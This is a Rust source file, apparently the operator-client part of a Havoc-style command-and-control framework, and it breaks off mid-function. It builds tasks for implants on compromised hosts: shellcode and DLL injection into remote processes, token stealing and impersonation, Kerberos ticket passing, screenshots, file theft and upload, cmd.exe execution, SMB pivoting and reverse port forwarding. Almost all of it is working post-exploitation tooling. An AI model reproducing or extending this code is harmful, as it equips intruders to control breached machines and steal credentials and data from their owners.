//! Task-builder functions for Demon agent commands and console helpers.
//!
//! This module constructs [`OperatorMessage`] payloads that are sent to the
//! teamserver and forwarded to the agent.  All functions are pure (no UI
//! side-effects) and depend only on types from `red_cell_common` and the
//! in-file state types.

use std::collections::BTreeMap;

use base64::Engine;
use eframe::egui::Color32;
use red_cell_common::demon::DemonCommand;
use red_cell_common::operator::{
    AgentTaskInfo, BuildPayloadRequestInfo, EventCode, FlatInfo, ListenerInfo, Message,
    MessageHead, NameInfo, OperatorMessage,
};

use crate::{
    AgentConsoleState, InjectionTargetAction, InjectionTechnique, PayloadDialogState, human_size,
    normalized_process_arch,
};

// ─── Task builders ───────────────────────────────────────────────────────────

pub(crate) fn build_kill_task(agent_id: &str, operator: &str) -> OperatorMessage {
    build_agent_task(
        operator,
        AgentTaskInfo {
            demon_id: agent_id.to_owned(),
            task_id: format!("{:08X}", next_task_id()),
            command_id: u32::from(DemonCommand::CommandExit).to_string(),
            command_line: "kill".to_owned(),
            command: Some("kill".to_owned()),
            ..AgentTaskInfo::default()
        },
    )
}

pub(crate) fn build_process_list_task(agent_id: &str, operator: &str) -> OperatorMessage {
    build_agent_task(
        operator,
        AgentTaskInfo {
            demon_id: agent_id.to_owned(),
            task_id: format!("{:08X}", next_task_id()),
            command_id: u32::from(DemonCommand::CommandProcList).to_string(),
            command_line: "ps".to_owned(),
            command: Some("ps".to_owned()),
            extra: BTreeMap::from([(
                "FromProcessManager".to_owned(),
                serde_json::Value::Bool(true),
            )]),
            ..AgentTaskInfo::default()
        },
    )
}

pub(crate) fn build_process_kill_task(agent_id: &str, pid: u32, operator: &str) -> OperatorMessage {
    build_agent_task(operator, process_kill_info(agent_id, pid))
}

pub(crate) fn build_process_injection_task(
    agent_id: &str,
    pid: u32,
    arch: &str,
    technique: InjectionTechnique,
    binary: &[u8],
    arguments: &str,
    action: InjectionTargetAction,
    operator: &str,
) -> OperatorMessage {
    let command_line = format!(
        "{} pid={} arch={} {}",
        action.label().to_ascii_lowercase(),
        pid,
        normalized_process_arch(arch),
        human_size(binary.len() as u64)
    );
    build_agent_task(
        operator,
        AgentTaskInfo {
            demon_id: agent_id.to_owned(),
            task_id: format!("{:08X}", next_task_id()),
            command_id: u32::from(DemonCommand::CommandInjectShellcode).to_string(),
            command_line,
            command: Some("shellcode".to_owned()),
            sub_command: Some("inject".to_owned()),
            extra: BTreeMap::from([
                ("Way".to_owned(), serde_json::Value::String("Inject".to_owned())),
                (
                    "Technique".to_owned(),
                    serde_json::Value::String(technique.as_wire_value().to_owned()),
                ),
                ("Arch".to_owned(), serde_json::Value::String(normalized_process_arch(arch))),
                (
                    "Binary".to_owned(),
                    serde_json::Value::String(
                        base64::engine::general_purpose::STANDARD.encode(binary),
                    ),
                ),
                ("PID".to_owned(), serde_json::Value::String(pid.to_string())),
                ("Action".to_owned(), serde_json::Value::String(action.label().to_owned())),
                (
                    "Arguments".to_owned(),
                    serde_json::Value::String(
                        base64::engine::general_purpose::STANDARD.encode(arguments.as_bytes()),
                    ),
                ),
            ]),
            ..AgentTaskInfo::default()
        },
    )
}

pub(crate) fn build_note_task(agent_id: &str, note: &str, operator: &str) -> OperatorMessage {
    build_agent_task(
        operator,
        AgentTaskInfo {
            demon_id: agent_id.to_owned(),
            task_id: format!("{:08X}", next_task_id()),
            command_id: "Teamserver".to_owned(),
            command_line: "note".to_owned(),
            command: Some("note".to_owned()),
            arguments: Some(note.to_owned()),
            ..AgentTaskInfo::default()
        },
    )
}

pub(crate) fn build_chat_message(operator: Option<&str>, message: &str) -> Option<OperatorMessage> {
    let trimmed = message.trim();
    if trimmed.is_empty() {
        return None;
    }

    Some(OperatorMessage::ChatMessage(Message {
        head: MessageHead {
            event: EventCode::Chat,
            user: operator.unwrap_or_default().to_owned(),
            timestamp: String::new(),
            one_time: String::new(),
        },
        info: FlatInfo {
            fields: std::collections::BTreeMap::from([(
                "Message".to_owned(),
                serde_json::Value::String(trimmed.to_owned()),
            )]),
        },
    }))
}

fn build_agent_task(operator: &str, info: AgentTaskInfo) -> OperatorMessage {
    OperatorMessage::AgentTask(Message {
        head: MessageHead {
            event: red_cell_common::operator::EventCode::Session,
            user: operator.to_owned(),
            timestamp: String::new(),
            one_time: String::new(),
        },
        info,
    })
}

pub(crate) fn build_listener_new(info: ListenerInfo, operator: &str) -> OperatorMessage {
    OperatorMessage::ListenerNew(Message {
        head: MessageHead {
            event: EventCode::Listener,
            user: operator.to_owned(),
            timestamp: String::new(),
            one_time: String::new(),
        },
        info,
    })
}

pub(crate) fn build_listener_edit(info: ListenerInfo, operator: &str) -> OperatorMessage {
    OperatorMessage::ListenerEdit(Message {
        head: MessageHead {
            event: EventCode::Listener,
            user: operator.to_owned(),
            timestamp: String::new(),
            one_time: String::new(),
        },
        info,
    })
}

pub(crate) fn build_listener_remove(name: &str, operator: &str) -> OperatorMessage {
    OperatorMessage::ListenerRemove(Message {
        head: MessageHead {
            event: EventCode::Listener,
            user: operator.to_owned(),
            timestamp: String::new(),
            one_time: String::new(),
        },
        info: NameInfo { name: name.to_owned() },
    })
}

pub(crate) fn build_payload_request(
    dialog: &PayloadDialogState,
    operator: &str,
) -> OperatorMessage {
    OperatorMessage::BuildPayloadRequest(Message {
        head: MessageHead {
            event: EventCode::Gate,
            user: operator.to_owned(),
            timestamp: String::new(),
            one_time: String::new(),
        },
        info: BuildPayloadRequestInfo {
            agent_type: dialog.agent_type.clone(),
            listener: dialog.listener.clone(),
            arch: dialog.arch.label().to_owned(),
            format: dialog.format.label().to_owned(),
            config: dialog.config_json(),
        },
    })
}

/// Map a build console message type to a display color.
pub(crate) fn build_console_message_color(message_type: &str) -> Color32 {
    match message_type {
        "Good" => Color32::from_rgb(85, 255, 85),
        "Error" => Color32::from_rgb(255, 85, 85),
        "Warning" => Color32::from_rgb(255, 200, 50),
        _ => Color32::from_rgb(180, 180, 220), // Info / default
    }
}

/// Map a build console message type to a prefix tag (like Havoc's [*] / [+] / [-]).
pub(crate) fn build_console_message_prefix(message_type: &str) -> &'static str {
    match message_type {
        "Good" => "[+]",
        "Error" => "[-]",
        "Warning" => "[!]",
        _ => "[*]",
    }
}

fn next_task_id() -> u32 {
    use std::sync::atomic::{AtomicU32, Ordering};

    static TASK_COUNTER: AtomicU32 = AtomicU32::new(1);
    TASK_COUNTER.fetch_add(1, Ordering::Relaxed)
}

/// Extract the task ID from an outgoing `AgentTask` message.
pub(crate) fn agent_task_id(message: &OperatorMessage) -> Option<String> {
    match message {
        OperatorMessage::AgentTask(m) => Some(m.info.task_id.clone()),
        _ => None,
    }
}

/// Returns the last 4 characters of a task ID for compact display (e.g. `"3f2a"`).
pub(crate) fn short_task_id(task_id: &str) -> &str {
    let bytes = task_id.as_bytes();
    if bytes.len() >= 4 {
        // SAFETY: task IDs are ASCII hex strings.
        &task_id[bytes.len() - 4..]
    } else {
        task_id
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(crate) enum HistoryDirection {
    Older,
    Newer,
}

/// Handles client-side commands that do not require a round-trip to the teamserver.
///
/// Returns `Some(output)` when the input matches a local command, or `None` if the
/// command should be forwarded to the teamserver.
pub(crate) fn handle_local_command(input: &str) -> Option<String> {
    let trimmed = input.trim();
    let mut parts = trimmed.split_whitespace();
    let command = parts.next()?.to_ascii_lowercase();

    match command.as_str() {
        "help" | "?" => {
            let topic = parts.next();
            Some(build_help_output(topic))
        }
        _ => None,
    }
}

/// Builds the formatted help text.
///
/// When `topic` is `None`, a full command table is produced (matching Havoc's
/// `help` output). When a specific command name is given, only that command's
/// usage and description are shown.
pub(crate) fn build_help_output(topic: Option<&str>) -> String {
    if let Some(name) = topic {
        let needle = name.to_ascii_lowercase();
        let spec = CONSOLE_COMMANDS
            .iter()
            .find(|spec| spec.name == needle || spec.aliases.iter().any(|alias| *alias == needle));
        return match spec {
            Some(spec) => {
                let mut out = format!(" {}\n", spec.name);
                out.push_str(&format!("   Usage:       {}\n", spec.usage));
                out.push_str(&format!("   Type:        {}\n", spec.cmd_type));
                out.push_str(&format!("   Description: {}\n", spec.description));
                if !spec.aliases.is_empty() {
                    out.push_str(&format!("   Aliases:     {}\n", spec.aliases.join(", ")));
                }
                out
            }
            None => format!("Unknown command `{name}`. Type `help` for available commands."),
        };
    }

    // Full command table.
    let mut out = String::from(" Demon Commands\n\n");
    out.push_str(&format!(" {:<22} {:<12} {}\n", "Command", "Type", "Description"));
    out.push_str(&format!(" {:<22} {:<12} {}\n", "-------", "----", "-----------"));
    for spec in &CONSOLE_COMMANDS {
        out.push_str(&format!(" {:<22} {:<12} {}\n", spec.name, spec.cmd_type, spec.description));
    }
    out
}

/// Formats the Havoc-style console prompt: `[operator/AGENT_ID] demon.x64 >> `.
pub(crate) fn format_console_prompt(operator: &str, agent_id: &str) -> String {
    let op = if operator.is_empty() { "operator" } else { operator };
    format!("[{op}/{agent_id}] demon.x64 >> ")
}

#[derive(Debug, Clone, Copy)]
pub(crate) struct ConsoleCommandSpec {
    pub(crate) name: &'static str,
    pub(crate) aliases: &'static [&'static str],
    pub(crate) usage: &'static str,
    pub(crate) cmd_type: &'static str,
    pub(crate) description: &'static str,
}

pub(crate) const CONSOLE_COMMANDS: [ConsoleCommandSpec; 28] = [
    ConsoleCommandSpec {
        name: "help",
        aliases: &["?"],
        usage: "help [command]",
        cmd_type: "Command",
        description: "Show available commands or help for a specific command",
    },
    ConsoleCommandSpec {
        name: "shell",
        aliases: &[],
        usage: "shell <command>",
        cmd_type: "Command",
        description: "Executes a shell command via cmd.exe",
    },
    ConsoleCommandSpec {
        name: "sleep",
        aliases: &[],
        usage: "sleep <seconds> [jitter%]",
        cmd_type: "Command",
        description: "Sets the agent sleep delay and optional jitter",
    },
    ConsoleCommandSpec {
        name: "checkin",
        aliases: &[],
        usage: "checkin",
        cmd_type: "Command",
        description: "Request the agent to check in immediately",
    },
    ConsoleCommandSpec {
        name: "kill",
        aliases: &["exit"],
        usage: "kill [process]",
        cmd_type: "Command",
        description: "Kill the agent (thread or process)",
    },
    ConsoleCommandSpec {
        name: "ps",
        aliases: &["proclist"],
        usage: "ps",
        cmd_type: "Command",
        description: "List running processes",
    },
    ConsoleCommandSpec {
        name: "screenshot",
        aliases: &[],
        usage: "screenshot",
        cmd_type: "Command",
        description: "Takes a screenshot of the current desktop",
    },
    ConsoleCommandSpec {
        name: "pwd",
        aliases: &[],
        usage: "pwd",
        cmd_type: "Command",
        description: "Print the current working directory",
    },
    ConsoleCommandSpec {
        name: "cd",
        aliases: &[],
        usage: "cd <path>",
        cmd_type: "Command",
        description: "Change the working directory",
    },
    ConsoleCommandSpec {
        name: "dir",
        aliases: &["ls"],
        usage: "dir <path>",
        cmd_type: "Command",
        description: "List files in a directory",
    },
    ConsoleCommandSpec {
        name: "mkdir",
        aliases: &[],
        usage: "mkdir <path>",
        cmd_type: "Command",
        description: "Create a directory",
    },
    ConsoleCommandSpec {
        name: "rm",
        aliases: &["del", "remove"],
        usage: "rm <path>",
        cmd_type: "Command",
        description: "Delete a file or directory",
    },
    ConsoleCommandSpec {
        name: "cp",
        aliases: &["copy"],
        usage: "cp <src> <dst>",
        cmd_type: "Command",
        description: "Copy a file to another location",
    },
    ConsoleCommandSpec {
        name: "mv",
        aliases: &["move"],
        usage: "mv <src> <dst>",
        cmd_type: "Command",
        description: "Move or rename a file",
    },
    ConsoleCommandSpec {
        name: "cat",
        aliases: &["type"],
        usage: "cat <path>",
        cmd_type: "Command",
        description: "Read and display a file's contents",
    },
    ConsoleCommandSpec {
        name: "download",
        aliases: &[],
        usage: "download <path>",
        cmd_type: "Command",
        description: "Download a file from the target",
    },
    ConsoleCommandSpec {
        name: "upload",
        aliases: &[],
        usage: "upload <local> <remote>",
        cmd_type: "Command",
        description: "Upload a local file to the target",
    },
    ConsoleCommandSpec {
        name: "proc",
        aliases: &[],
        usage: "proc <kill|modules|grep|create|memory> [args]",
        cmd_type: "Command",
        description: "Process management and inspection",
    },
    ConsoleCommandSpec {
        name: "token",
        aliases: &[],
        usage: "token <list|steal|make|impersonate|revert|privs|uid|clear> [args]",
        cmd_type: "Command",
        description: "Token impersonation and management",
    },
    ConsoleCommandSpec {
        name: "inline-execute",
        aliases: &["bof"],
        usage: "inline-execute <bof-path> [args]",
        cmd_type: "Command",
        description: "Execute a Beacon Object File (COFF) in-process",
    },
    ConsoleCommandSpec {
        name: "inject-dll",
        aliases: &[],
        usage: "inject-dll <pid> <dll-path>",
        cmd_type: "Module",
        description: "Inject a DLL into a remote process",
    },
    ConsoleCommandSpec {
        name: "inject-shellcode",
        aliases: &[],
        usage: "inject-shellcode <pid> <bin-path>",
        cmd_type: "Module",
        description: "Inject shellcode into a remote process",
    },
    ConsoleCommandSpec {
        name: "spawn-dll",
        aliases: &[],
        usage: "spawn-dll <dll-path> [args]",
        cmd_type: "Module",
        description: "Spawn a sacrificial process and inject a DLL",
    },
    ConsoleCommandSpec {
        name: "net",
        aliases: &[],
        usage: "net <domain|logons|sessions|computers|dclist|share|localgroup|group> [args]",
        cmd_type: "Command",
        description: "Network and Active Directory enumeration",
    },
    ConsoleCommandSpec {
        name: "pivot",
        aliases: &[],
        usage: "pivot <list|connect|disconnect> [args]",
        cmd_type: "Command",
        description: "SMB pivot link management",
    },
    ConsoleCommandSpec {
        name: "rportfwd",
        aliases: &[],
        usage: "rportfwd <add|remove|list|clear> [args]",
        cmd_type: "Command",
        description: "Reverse port forwarding through the agent",
    },
    ConsoleCommandSpec {
        name: "kerberos",
        aliases: &[],
        usage: "kerberos <luid|klist|purge|ptt> [args]",
        cmd_type: "Command",
        description: "Kerberos ticket management",
    },
    ConsoleCommandSpec {
        name: "config",
        aliases: &[],
        usage: "config <sleep-obf|implant.verbose|inject.spoofaddr|killdate|workinghours> [args]",
        cmd_type: "Command",
        description: "Modify agent runtime configuration",
    },
];

// ─── File browser task builders ──────────────────────────────────────────────

pub(crate) fn build_file_browser_list_task(
    agent_id: &str,
    path: &str,
    operator: &str,
) -> OperatorMessage {
    build_agent_task(
        operator,
        AgentTaskInfo {
            demon_id: agent_id.to_owned(),
            task_id: format!("{:08X}", next_task_id()),
            command_id: u32::from(DemonCommand::CommandFs).to_string(),
            command_line: format!("ls {path}"),
            command: Some("fs".to_owned()),
            sub_command: Some("dir".to_owned()),
            arguments: Some(format!("{path};true;false;false;false;;;")),
            ..AgentTaskInfo::default()
        },
    )
}

pub(crate) fn build_file_browser_pwd_task(agent_id: &str, operator: &str) -> OperatorMessage {
    build_agent_task(operator, filesystem_task(agent_id, "pwd", "pwd", None))
}

pub(crate) fn build_file_browser_cd_task(
    agent_id: &str,
    path: &str,
    operator: &str,
) -> OperatorMessage {
    build_agent_task(
        operator,
        filesystem_task(agent_id, &format!("cd {path}"), "cd", Some(path.to_owned())),
    )
}

pub(crate) fn build_file_browser_download_task(
    agent_id: &str,
    path: &str,
    operator: &str,
) -> OperatorMessage {
    build_agent_task(
        operator,
        filesystem_transfer_task(agent_id, &format!("download {path}"), "download", path),
    )
}

pub(crate) fn build_file_browser_delete_task(
    agent_id: &str,
    path: &str,
    operator: &str,
) -> OperatorMessage {
    build_agent_task(
        operator,
        filesystem_task(agent_id, &format!("rm {path}"), "remove", Some(path.to_owned())),
    )
}

pub(crate) fn build_file_browser_upload_task(
    agent_id: &str,
    remote_path: &str,
    content: &[u8],
    operator: &str,
) -> OperatorMessage {
    let remote = base64::engine::general_purpose::STANDARD.encode(remote_path.as_bytes());
    let content = base64::engine::general_purpose::STANDARD.encode(content);
    build_agent_task(
        operator,
        AgentTaskInfo {
            demon_id: agent_id.to_owned(),
            task_id: format!("{:08X}", next_task_id()),
            command_id: u32::from(DemonCommand::CommandFs).to_string(),
            command_line: format!("upload {remote_path}"),
            command: Some("fs".to_owned()),
            sub_command: Some("upload".to_owned()),
            arguments: Some(format!("{remote};{content}")),
            ..AgentTaskInfo::default()
        },
    )
}

/// Builds a `CommandTransfer` stop task to cancel an in-progress download.
///
/// The binary payload `[stop_subcommand_u32_le, file_id_u32_le]` is pre-encoded as
/// `PayloadBase64` so the teamserver forwards it verbatim to the agent.  This avoids
/// adding transfer-command encoding logic to the teamserver's `task_payload` function.
///
/// Returns `None` if `file_id_hex` cannot be parsed as a hexadecimal `u32`.
pub(crate) fn build_transfer_stop_task(
    agent_id: &str,
    file_id_hex: &str,
    operator: &str,
) -> Option<OperatorMessage> {
    let file_id = u32::from_str_radix(file_id_hex.trim(), 16).ok().or_else(|| {
        // Handle 64-bit hex file IDs by taking the lower 32 bits.
        u64::from_str_radix(file_id_hex.trim(), 16).ok().map(|v| v as u32)
    })?;
    // Binary payload: [DEMON_COMMAND_TRANSFER_STOP=1 as u32 LE, file_id as u32 LE]
    let mut payload = Vec::with_capacity(8);
    payload.extend_from_slice(&1u32.to_le_bytes());
    payload.extend_from_slice(&file_id.to_le_bytes());
    let payload_b64 = base64::engine::general_purpose::STANDARD.encode(&payload);
    Some(build_agent_task(
        operator,
        AgentTaskInfo {
            demon_id: agent_id.to_owned(),
            task_id: format!("{:08X}", next_task_id()),
            command_id: u32::from(red_cell_common::demon::DemonCommand::CommandTransfer)
                .to_string(),
            command_line: format!("transfer stop {file_id_hex}"),
            extra: BTreeMap::from([(
                "PayloadBase64".to_owned(),
                serde_json::Value::String(payload_b64),
            )]),
            ..AgentTaskInfo::default()
        },
    ))
}

// ─── Console task dispatch ────────────────────────────────────────────────────

pub(crate) fn build_console_task(
    agent_id: &str,
    input: &str,
    operator: &str,
) -> Result<OperatorMessage, String> {
    let trimmed = input.trim();
    let mut parts = trimmed.split_whitespace();
    let Some(command) = parts.next() else {
        return Err("Command input is empty.".to_owned());
    };
    let command = command.to_ascii_lowercase();

    let info = match command.as_str() {
        // Local-only commands are handled before this function is called.
        "help" | "?" => {
            return Err("Use the help command for usage information.".to_owned());
        }
        "shell" => {
            let shell_cmd = rest_after_word(trimmed)?;
            simple_task(
                agent_id,
                trimmed,
                DemonCommand::CommandInlineExecute,
                "shell",
                Some(shell_cmd),
            )
        }
        "sleep" => sleep_task(agent_id, trimmed)?,
        "checkin" => simple_task(agent_id, trimmed, DemonCommand::CommandCheckin, "checkin", None),
        "kill" | "exit" => AgentTaskInfo {
            demon_id: agent_id.to_owned(),
            task_id: format!("{:08X}", next_task_id()),
            command_id: u32::from(DemonCommand::CommandExit).to_string(),
            command_line: trimmed.to_owned(),
            command: Some("kill".to_owned()),
            arguments: parts.next().map(ToOwned::to_owned),
            ..AgentTaskInfo::default()
        },
        "ps" | "proclist" => {
            simple_task(agent_id, trimmed, DemonCommand::CommandProcList, "ps", None)
        }
        "screenshot" => {
            simple_task(agent_id, trimmed, DemonCommand::CommandScreenshot, "screenshot", None)
        }
        "pwd" => filesystem_task(agent_id, trimmed, "pwd", None),
        "cd" => filesystem_task(agent_id, trimmed, "cd", Some(rest_after_word(trimmed)?)),
        "dir" | "ls" => {
            let path = rest_after_word(trimmed)?;
            filesystem_task(
                agent_id,
                trimmed,
                "dir",
                Some(format!("{path};true;false;false;false;;;")),
            )
        }
        "mkdir" => filesystem_task(agent_id, trimmed, "mkdir", Some(rest_after_word(trimmed)?)),
        "rm" | "del" | "remove" => {
            filesystem_task(agent_id, trimmed, "remove", Some(rest_after_word(trimmed)?))
        }
        "cp" | "copy" => filesystem_copy_or_move_task(agent_id, trimmed, "cp")?,
        "mv" | "move" => filesystem_copy_or_move_task(agent_id, trimmed, "move")?,
        "download" => {
            filesystem_transfer_task(agent_id, trimmed, "download", &rest_after_word(trimmed)?)
        }
        "upload" => upload_console_task(agent_id, trimmed)?,
        "cat" | "type" => {
            filesystem_transfer_task(agent_id, trimmed, "cat", &rest_after_word(trimmed)?)
        }
        "proc" => process_task(agent_id, trimmed)?,
        "token" => token_task(agent_id, trimmed)?,
        "inline-execute" | "bof" => inline_execute_task(agent_id, trimmed)?,
        "inject-dll" => inject_dll_console_task(agent_id, trimmed)?,
        "inject-shellcode" => inject_shellcode_console_task(agent_id, trimmed)?,
        "spawn-dll" => spawn_dll_console_task(agent_id, trimmed)?,
        "net" => net_task(agent_id, trimmed)?,
        "pivot" => pivot_task(agent_id, trimmed)?,
        "rportfwd" => rportfwd_task(agent_id, trimmed)?,
        "kerberos" => kerberos_task(agent_id, trimmed)?,
        "config" => config_task(agent_id, trimmed)?,
        _ => {
            let usage =
                closest_command_usage(&command).unwrap_or("Type `help` for available commands.");
            return Err(format!("Unsupported console command `{command}`. {usage}"));
        }
    };

    Ok(build_agent_task(operator, info))
}

pub(crate) fn filesystem_task(
    agent_id: &str,
    command_line: &str,
    sub_command: &str,
    arguments: Option<String>,
) -> AgentTaskInfo {
    AgentTaskInfo {
        demon_id: agent_id.to_owned(),
        task_id: format!("{:08X}", next_task_id()),
        command_id: u32::from(DemonCommand::CommandFs).to_string(),
        command_line: command_line.to_owned(),
        command: Some("fs".to_owned()),
        sub_command: Some(sub_command.to_owned()),
        arguments,
        ..AgentTaskInfo::default()
    }
}

pub(crate) fn filesystem_transfer_task(
    agent_id: &str,
    command_line: &str,
    sub_command: &str,
    path: &str,
) -> AgentTaskInfo {
    let encoded = Some(base64::engine::general_purpose::STANDARD.encode(path.as_bytes()));
    AgentTaskInfo {
        demon_id: agent_id.to_owned(),
        task_id: format!("{:08X}", next_task_id()),
        command_id: u32::from(DemonCommand::CommandFs).to_string(),
        command_line: command_line.to_owned(),
        command: Some("fs".to_owned()),
        sub_command: Some(sub_command.to_owned()),
        arguments: encoded,
        ..AgentTaskInfo::default()
    }
}

pub(crate) fn process_task(agent_id: &str, command_line: &str) -> Result<AgentTaskInfo, String> {
    let mut parts = command_line.split_whitespace();
    let _ = parts.next();
    let sub_command = parts
        .next()
        .ok_or_else(|| "Usage: proc <kill|modules|grep|create|memory> [args]".to_owned())?;
    let sub_lower = sub_command.to_ascii_lowercase();
    match sub_lower.as_str() {
        "kill" => {
            let pid = parts.next().ok_or_else(|| "Usage: proc kill <pid>".to_owned())?;
            if parts.next().is_some() {
                return Err("Usage: proc kill <pid>".to_owned());
            }
            let pid = pid.parse::<u32>().map_err(|_| format!("Invalid PID `{pid}`."))?;
            Ok(process_kill_info(agent_id, pid))
        }
        "modules" | "grep" | "create" | "memory" => {
            let args: String = parts.collect::<Vec<_>>().join(" ");
            Ok(AgentTaskInfo {
                demon_id: agent_id.to_owned(),
                task_id: format!("{:08X}", next_task_id()),
                command_id: u32::from(DemonCommand::CommandProc).to_string(),
                command_line: command_line.to_owned(),
                command: Some("proc".to_owned()),
                sub_command: Some(sub_lower),
                arguments: if args.is_empty() { None } else { Some(args) },
                ..AgentTaskInfo::default()
            })
        }
        _ => Err("Usage: proc <kill|modules|grep|create|memory> [args]".to_owned()),
    }
}

fn process_kill_info(agent_id: &str, pid: u32) -> AgentTaskInfo {
    AgentTaskInfo {
        demon_id: agent_id.to_owned(),
        task_id: format!("{:08X}", next_task_id()),
        command_id: u32::from(DemonCommand::CommandProc).to_string(),
        command_line: format!("proc kill {pid}"),
        command: Some("proc".to_owned()),
        sub_command: Some("kill".to_owned()),
        arguments: Some(pid.to_string()),
        extra: BTreeMap::from([("Args".to_owned(), serde_json::Value::String(pid.to_string()))]),
        ..AgentTaskInfo::default()
    }
}

/// Builds a task with a single command ID and optional arguments string.
fn simple_task(
    agent_id: &str,
    command_line: &str,
    demon_cmd: DemonCommand,
    command_name: &str,
    arguments: Option<String>,
) -> AgentTaskInfo {
    AgentTaskInfo {
        demon_id: agent_id.to_owned(),
        task_id: format!("{:08X}", next_task_id()),
        command_id: u32::from(demon_cmd).to_string(),
        command_line: command_line.to_owned(),
        command: Some(command_name.to_owned()),
        arguments,
        ..AgentTaskInfo::default()
    }
}

fn sleep_task(agent_id: &str, command_line: &str) -> Result<AgentTaskInfo, String> {
    let mut parts = command_line.split_whitespace();
    let _ = parts.next(); // skip "sleep"
    let delay = parts.next().ok_or_else(|| "Usage: sleep <seconds> [jitter%]".to_owned())?;
    let jitter = parts.next().unwrap_or("0");
    let delay_val: u32 = delay.parse().map_err(|_| format!("Invalid delay `{delay}`."))?;
    let jitter_val: u32 =
        jitter.trim_end_matches('%').parse().map_err(|_| format!("Invalid jitter `{jitter}`."))?;
    Ok(AgentTaskInfo {
        demon_id: agent_id.to_owned(),
        task_id: format!("{:08X}", next_task_id()),
        command_id: u32::from(DemonCommand::CommandSleep).to_string(),
        command_line: command_line.to_owned(),
        command: Some("sleep".to_owned()),
        arguments: Some(format!("{delay_val};{jitter_val}")),
        ..AgentTaskInfo::default()
    })
}

fn filesystem_copy_or_move_task(
    agent_id: &str,
    command_line: &str,
    sub_command: &str,
) -> Result<AgentTaskInfo, String> {
    let rest = rest_after_word(command_line)?;
    let mut parts = rest.splitn(2, char::is_whitespace);
    let src = parts.next().ok_or_else(|| format!("Usage: {sub_command} <src> <dst>"))?;
    let dst = parts
        .next()
        .map(str::trim)
        .filter(|s| !s.is_empty())
        .ok_or_else(|| format!("Usage: {sub_command} <src> <dst>"))?;
    Ok(filesystem_task(agent_id, command_line, sub_command, Some(format!("{src};{dst}"))))
}

fn upload_console_task(agent_id: &str, command_line: &str) -> Result<AgentTaskInfo, String> {
    let rest = rest_after_word(command_line)?;
    let mut parts = rest.splitn(2, char::is_whitespace);
    let local_path = parts.next().ok_or_else(|| "Usage: upload <local> <remote>".to_owned())?;
    let remote_path = parts
        .next()
        .map(str::trim)
        .filter(|s| !s.is_empty())
        .ok_or_else(|| "Usage: upload <local> <remote>".to_owned())?;
    let content =
        std::fs::read(local_path).map_err(|err| format!("Failed to read `{local_path}`: {err}"))?;
    let remote_b64 = base64::engine::general_purpose::STANDARD.encode(remote_path.as_bytes());
    let content_b64 = base64::engine::general_purpose::STANDARD.encode(&content);
    Ok(AgentTaskInfo {
        demon_id: agent_id.to_owned(),
        task_id: format!("{:08X}", next_task_id()),
        command_id: u32::from(DemonCommand::CommandFs).to_string(),
        command_line: command_line.to_owned(),
        command: Some("fs".to_owned()),
        sub_command: Some("upload".to_owned()),
        arguments: Some(format!("{remote_b64};{content_b64}")),
        ..AgentTaskInfo::default()
    })
}

fn token_task(agent_id: &str, command_line: &str) -> Result<AgentTaskInfo, String> {
    let mut parts = command_line.split_whitespace();
    let _ = parts.next(); // skip "token"
    let sub = parts.next().ok_or_else(|| {
        "Usage: token <list|steal|make|impersonate|revert|privs|uid|clear> [args]".to_owned()
    })?;
    let sub_lower = sub.to_ascii_lowercase();
    let args: String = parts.collect::<Vec<_>>().join(" ");
    Ok(AgentTaskInfo {
        demon_id: agent_id.to_owned(),
        task_id: format!("{:08X}", next_task_id()),
        command_id: u32::from(DemonCommand::CommandToken).to_string(),
        command_line: command_line.to_owned(),
        command: Some("token".to_owned()),
        sub_command: Some(sub_lower),
        arguments: if args.is_empty() { None } else { Some(args) },
        ..AgentTaskInfo::default()
    })
}

fn inline_execute_task(agent_id: &str, command_line: &str) -> Result<AgentTaskInfo, String> {
    let rest = rest_after_word(command_line)?;
    let mut parts = rest.splitn(2, char::is_whitespace);
    let bof_path =
        parts.next().ok_or_else(|| "Usage: inline-execute <bof-path> [args]".to_owned())?;
    let bof_args = parts.next().unwrap_or_default().trim().to_owned();
    let binary =
        std::fs::read(bof_path).map_err(|err| format!("Failed to read `{bof_path}`: {err}"))?;
    let binary_b64 = base64::engine::general_purpose::STANDARD.encode(&binary);
    Ok(AgentTaskInfo {
        demon_id: agent_id.to_owned(),
        task_id: format!("{:08X}", next_task_id()),
        command_id: u32::from(DemonCommand::CommandInlineExecute).to_string(),
        command_line: command_line.to_owned(),
        command: Some("inline-execute".to_owned()),
        arguments: Some(if bof_args.is_empty() {
            binary_b64
        } else {
            format!("{binary_b64};{bof_args}")
        }),
        ..AgentTaskInfo::default()
    })
}

fn inject_dll_console_task(agent_id: &str, command_line: &str) -> Result<AgentTaskInfo, String> {
    let rest = rest_after_word(command_line)?;
    let mut parts = rest.splitn(2, char::is_whitespace);
    let pid_str = parts.next().ok_or_else(|| "Usage: inject-dll <pid> <dll-path>".to_owned())?;
    let dll_path = parts
        .next()
        .map(str::trim)
        .filter(|s| !s.is_empty())
        .ok_or_else(|| "Usage: inject-dll <pid> <dll-path>".to_owned())?;
    let pid: u32 = pid_str.parse().map_err(|_| format!("Invalid PID `{pid_str}`."))?;
    let binary =
        std::fs::read(dll_path).map_err(|err| format!("Failed to read `{dll_path}`: {err}"))?;
    let binary_b64 = base64::engine::general_purpose::STANDARD.encode(&binary);
    Ok(AgentTaskInfo {
        demon_id: agent_id.to_owned(),
        task_id: format!("{:08X}", next_task_id()),
        command_id: u32::from(DemonCommand::CommandInjectDll).to_string(),
        command_line: command_line.to_owned(),
        command: Some("inject-dll".to_owned()),
        extra: BTreeMap::from([
            ("PID".to_owned(), serde_json::Value::Number(serde_json::Number::from(pid))),
            ("Binary".to_owned(), serde_json::Value::String(binary_b64)),
        ]),
        ..AgentTaskInfo::default()
    })
}

fn inject_shellcode_console_task(
    agent_id: &str,
    command_line: &str,
) -> Result<AgentTaskInfo, String> {
    let rest = rest_after_word(command_line)?;
    let mut parts = rest.splitn(2, char::is_whitespace);
    let pid_str =
        parts.next().ok_or_else(|| "Usage: inject-shellcode <pid> <bin-path>".to_owned())?;
    let bin_path = parts
        .next()
        .map(str::trim)
        .filter(|s| !s.is_empty())
        .ok_or_else(|| "Usage: inject-shellcode <pid> <bin-path>".to_owned())?;
    let pid: u32 = pid_str.parse().map_err(|_| format!("Invalid PID `{pid_str}`."))?;
    let binary =
        std::fs::read(bin_path).map_err(|err| format!("Failed to read `{bin_path}`: {err}"))?;
    let binary_b64 = base64::engine::general_purpose::STANDARD.encode(&binary);
    Ok(AgentTaskInfo {
        demon_id: agent_id.to_owned(),
        task_id: format!("{:08X}", next_task_id()),
